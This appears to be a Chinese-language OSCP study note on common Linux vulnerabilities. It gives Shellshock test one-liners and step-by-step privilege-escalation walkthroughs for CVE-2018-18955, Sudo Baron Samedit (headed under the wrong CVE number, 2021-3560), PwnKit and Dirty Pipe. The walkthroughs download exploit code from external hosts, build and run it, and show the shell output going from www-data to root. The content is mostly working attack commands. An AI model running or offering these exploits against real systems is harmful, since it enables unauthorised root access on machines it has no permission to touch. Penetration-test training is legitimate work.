---
layer: article
title: Common Linux Vulnerabilities
tags: oscp
---



## 破壳 CVE-2014-6271

```bash
env x='() { :;}; echo Vulnerable CVE-2014-6271 ' bash -c "echo test"
```

演示：<https://github.com/vulhub/vulhub/tree/3a513cc4d40b5bf9035a2774b82ab56c9676bda7/bash/CVE-2014-6271>

## 破壳变种  CVE-2014-7169

```bash
env X='() { (shellshocker.net)=>\' bash -c "echo date"; cat echo; rm ./echo
```

## 破壳变种  CVE-2014-7186

```bash
$ bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || 
echo "CVE-2014-7186 vulnerable, redir_stack"
```

## 破壳变种  CVE-2014-7187

```bash
$ (for x in {1..200} ; do echo "for x$x in ; do :"; done; for x in {1..200} ; do echo done ; done) | bash ||
echo "CVE-2014-7187 vulnerable, word_lineno"
```

## 破壳变种  CVE-2014-6278

```bash
shellshocker='() { echo You are vulnerable; }' bash -c shellshocker
```

## 破壳变种  CVE-2014-6277

```bash
bash -c "f() { x() { _;}; x() { _;} <<a; }" 2>/dev/null || echo vulnerable
```

## 脏牛 CVE-2016-5195

**参考：[深度分析“大小脏牛”漏洞：CVE-2016-5195和CVE-2017-1000405](https://www.freebuf.com/articles/network/283313.html)**

## 大脏牛 CVE-2017-1000405

**参考：[深度分析“大小脏牛”漏洞：CVE-2016-5195和CVE-2017-1000405](https://www.freebuf.com/articles/network/283313.html)**

## CVE-2018-18955



```bash
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47166.zip
unzip 47166.zip
cd ldpreload
./exploit.ldpreload.sh

```

https://bugs.chromium.org/p/project-zero/issues/detail?id=1712

https://github.com/scheatkode/CVE-2018-18955

## CVE-2021-3560

### 帮助

<https://github.com/worawit/CVE-2021-3156>

### 实例

```bash
/tmp$ git clone https://github.com/worawit/CVE-2021-3156
/tmp$ cd CVE-2021-3156
/tmp/CVE-2021-3156$ python exploit_nss.py 
# whoami
root
```



## CVE-2021-4034

### 帮助

<https://github.com/berdav/CVE-2021-4034>

### 实例

```bash
/tmp$ git clone https://github.com/berdav/CVE-2021-4034
git clone https://github.com/berdav/CVE-2021-4034
Cloning into 'CVE-2021-4034'...
remote: Enumerating objects: 92, done.        
remote: Counting objects: 100% (36/36), done.        
remote: Compressing objects: 100% (17/17), done.        
remote: Total 92 (delta 24), reused 19 (delta 19), pack-reused 56        
Unpacking objects: 100% (92/92), done.
/tmp$ cd CVE-2021-4034
/tmp/CVE-2021-4034$ ls
ls
cve-2021-4034.c   dry-run  Makefile  README.md
cve-2021-4034.sh  LICENSE  pwnkit.c
/tmp/CVE-2021-4034$ pwd
pwd
/tmp/CVE-2021-4034
/tmp/CVE-2021-4034$ make
make
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp -f /bin/true GCONV_PATH=./pwnkit.so:.
/tmp/CVE-2021-4034$ whoami
whoami
www-data
/tmp/CVE-2021-4034$ ./cve-2021-4034
./cve-2021-4034
# whoami
whoami
root
```

如果没有编译环境

```bash
/tmp$ git clone https://github.com/berdav/CVE-2021-4034
/tmp$ cd CVE-2021-4034
/tmp/CVE-2021-4034$ 


wget https://pan.iihack.com/d/CVE/cve-2021-4034
wget https://pan.iihack.com/d/CVE/cve-2021-4034/pwnkit.so
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp -f /bin/true GCONV_PATH=./pwnkit.so:.
chmod +x cve-2021-4034
./cve-2021-4034


whoami

```



## 脏管 CVE-2022-0847

1. poc by [Arinerron](https://github.com/Arinerron)

<https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/blob/main/exploit.c>

执行后密码root修改为`aaron`

2. poc by [r1is](https://github.com/r1is)

<https://github.com/r1is/CVE-2022-0847/blob/main/Dirty-Pipe.sh>

执行后获得root shell

```bash
git clone https://github.com/r1is/CVE-2022-0847.git
cd CVE-2022-0847
chmod +x Dirty-Pipe.sh
bash Dirty-Pipe.sh
```

还有几个待补充

**参考：[CVE-2022-0847 Linux 脏管漏洞分析与利用](https://www.freebuf.com/vuls/331378.html)**
